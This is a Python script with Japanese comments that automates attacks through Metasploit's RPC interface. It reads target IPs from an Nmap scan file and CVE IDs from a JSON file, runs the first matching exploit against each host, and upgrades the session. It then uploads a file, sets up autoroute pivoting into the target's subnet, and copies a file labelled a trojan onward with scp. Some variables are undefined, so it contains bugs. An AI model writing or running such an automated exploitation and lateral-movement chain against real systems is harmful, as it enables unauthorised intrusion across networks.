from pymetasploit3.msfrpc import MsfRpcClient
import time
import json
import csv

# Connect to the RPC server
#client = MsfRpcClient('QmTp4Atl')

REAL_TARGET_CONFIG="Nmap_scan/scan_config.csv"

def read_scan_config(): #scan_config.csvを読み込む関数
    host_list = [] #ホスト名
    ip_list = [] #ipアドレス名
    with open('../'+REAL_TARGET_CONFIG, 'r') as csvfile:
        csv_read = csv.reader(csvfile)
        for i in csv_read: #１行ずつ読み込む
            host_list.append(i[0]) #ホスト名を追加
            ip_list.append(i[1]) #ipアドレス名を追加
    return host_list, ip_list #ホスト名,ipアドレス名を返す

def read_json(): #attack_info.jsonを読み込む関数
    with open("./attack_info.json",'r') as load_f:
        info_dict = json.load(load_f)
        return info_dict

def attack(ip, vul, session_num, router): #ターゲットネットワークに攻撃する際のコンソールの関数
    cid = client.consoles.console().cid #新しいコンソールを作成し、その番号を「cid」に保存
    print(client.consoles.console(cid).write('search cve:' + vul)) #出力:cveを検索
    client.consoles.console(cid).destroy
    client.consoles.console(cid).write('use 0') #use 0
    client.consoles.console(cid).destroy
    client.consoles.console(cid).write('set RHOSTS ' + ip) #set RHOSTS ip
    client.consoles.console(cid).destroy 
    client.consoles.console(cid).write('run') #コンソール出力:run
    time.sleep(3) #3秒停止
    client.consoles.console(cid).destroy
    #shell1 = client.sessions.session(list(client.sessions.list.keys())[0])
    client.consoles.console(cid).write('sessions -u ' + str(session_num)) #今のセッション
    time.sleep(60) #60秒停止
    client.consoles.console(cid).destroy
    client.consoles.console(cid).write('sessions -i ' + str(session_num + 1)) #次のセッション
    client.consoles.console(cid).destroy
    client.consoles.console(cid).write('cd tmp') #tmpディレクトリに移動
    client.consoles.console(cid).destroy
    client.consoles.console(cid).write('upload 123.txt /tmp') #upload 123.txt
    client.consoles.console(cid).destroy
    client.consoles.console(cid).write('run autoroute -s ' + router + '.' + '0/24') #
    print(client.consoles.console(cid).read()) #出力:cidを表示
    client.consoles.console(cid).destroy

def copy_trojan(session_num): #trojan:脅威データベース
    client.consoles.console(cid).write('sessions -i ' + str(session_num)) #今のセッション
    client.consoles.console(cid).destroy
    client.consoles.console(cid).write('scp /tmp/123.txt hostname@/tmp/') #/tmp/123.txtをhostname@/tmp/にコピー
    client.consoles.console(cid).destroy

if __name__ == "__main__":
    print("Use real target IP addresses in '{}'".format(REAL_TARGET_CONFIG)) #出力scan_configのIPアドレスを使用
    host_list = read_scan_config()[0] #ホスト名
    ip_list = read_scan_config()[1] #ipアドレス
    count = 0 
    session_num = 1 
    for i in read_json().values(): 
        if i != 'Trojan': #jsonがTrojanじゃない場合
            router = ip_list[count].split('.')[0] + '.' + ip_list[count].split('.')[1] + '.' + ip_list[count].split('.')[2]
            attack(ip_list[count], i[1].strip("'"), session_num, router)
            session_num = session_num + 2
        else: #jsonがTrojanの場合
            copy_trojan(session_num)
        count = count + 1
